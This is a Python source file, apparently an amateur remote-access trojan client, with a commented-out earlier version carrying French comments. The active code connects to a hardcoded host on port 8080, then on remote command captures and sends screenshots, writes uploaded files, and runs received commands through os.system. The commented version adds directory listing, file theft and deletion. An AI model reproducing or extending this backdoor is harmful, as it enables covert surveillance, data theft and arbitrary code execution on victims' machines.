import os, socket, pyautogui, sys


i=0
while True:
	try:
		s= socket.socket()
		host= "LAPTOP-UJRO7ANB"
		port= 8080
		try:
			s.connect((host, port))
			print(f"\n[ALERT: Connection has been established with {host}]")
			i=0

		except Exception:
			print("[ALERT: Cannot join the server]")
			i+=1
			if i>=10:
				print("[Closing...]")
				break

			else:
				continue

		while True:
			print("- - - - - - - - - - - - \n[Waiting for order...]")
			command= s.recv(1024).decode()
			if not command:
				sys.exit()


			if command in ["scrn", "screenshot"]:
				try:
					file_path= "C:/Users/KYLIAN~1/AppData/Local/Temp/Wi999856.png"
					# Take screenshot
					pyautogui.screenshot(file_path)
					# Open screenshot
					image= open(file_path, "rb")
					byte= image.read()
					image.close()
					os.remove(file_path)
					s.sendall(byte)
					print("[Screenshot has been taken]")
					s.send(True)
					print("test")
					
				except:
					s.send(False)

			elif command in ["upl", "upload", "upload_file"]:
				try:
					data= s.recv(1000000)
					print("[File has been receive]")	
					file= open("test.jpg", "wb")
					file.write(data)
					file.close()
					print("[File has been uploaded successfully]")
					s.send(True)

				except:
					s.send(False)

			elif command in ["exe", "exec", "execute"]:
				try:
					print("[Waiting for File path]")
					file_path= s.recv(1024).decode()
					os.system(file_path)
					print("[File is running]")
					s.send(True)

				except:
					s.send(False)
	except:
		print(f"\n[ALERT: No more connexion with {host}]")


# """
# Command:
# 	view_cwd: see courant directory
# 	custom_dir: see custom directory
# 	download_file: will download files from directory
# """
# # Création de l'objet de communication
# s= socket.socket()

# # Définition de l'host / port
# host= str(input("Please enter an IP address: "))
# port= 8080

# # Connection au serveur 
# s.connect((host, port))
# print(f"[Connected to {host} successfully]")

# while 1:
# 	print("\n[Waiting order...]")

# 	# reception de l'ordre encodé a exécuter
# 	command= s.recv(1024)

# 	# Décode de l'ordre
# 	command= command.decode()
# 	print("[Command reseaved]")
# 	if command == "view_cwd":

# 		# Attribution du répertoire courant
# 		files= os.getcwd()
# 		files= str(files)

# 		# envoie de la réponce, encodé
# 		s.send(files.encode())
# 		print("[Command has benn executed successfully]")

# 	elif command == "custom_dir":
# 		print("[Waiting for custom directory...]")

# 		# reception du nom de fichier 
# 		user_input= s.recv(5000)

# 		# Decode du de fichier
# 		user_input= user_input.decode()

# 		# Liste de tout les repertoire et fichier dans le repertoire courant
# 		files= os.listdir(user_input)
# 		files= str(files)

# 		# envoie de la réponce, encodé
# 		s.send(files.encode())
# 		print("[Command has benn executed successfully]")

# 	elif command == "dowWnload_file":
# 		print("[Waiting for file path]")
# 		# Réception du chemin d'accès au fichier
# 		file_path= s.recv(5000)

# 		# Decode du chemin d'accès au fichier
# 		file_path= file_path.decode()

# 		# Ouverture du fichier spécifié
# 		file= open(file_path, "rb")

# 		# Lecture
# 		data= file.read()

# 		# Envoie du fichier
# 		s.send(data)
# 		print("[File has been send successfully]")

# 	elif command== "delete_file":
# 		print("[Waiting for file path]")
# 		file_path= s.recv(1024)
# 		os.remove(file_path)
# 		print("[File has been deleted]")

# 	elif command == "screenshot":
# 		pyautogui.screenshot("C:/Users/KYLIAN~1/AppData/Local/Temp/Wind.png")
# 		Picture= open("C:/Users/KYLIAN~1/AppData/Local/Temp/Wind.png", "rb")
# 		Data= Picture.readline()
# 		# s.send(Data.encode())


# 	else:
# 		print("[Command not recognised]")

# system
# getcwd
# listdir
# remove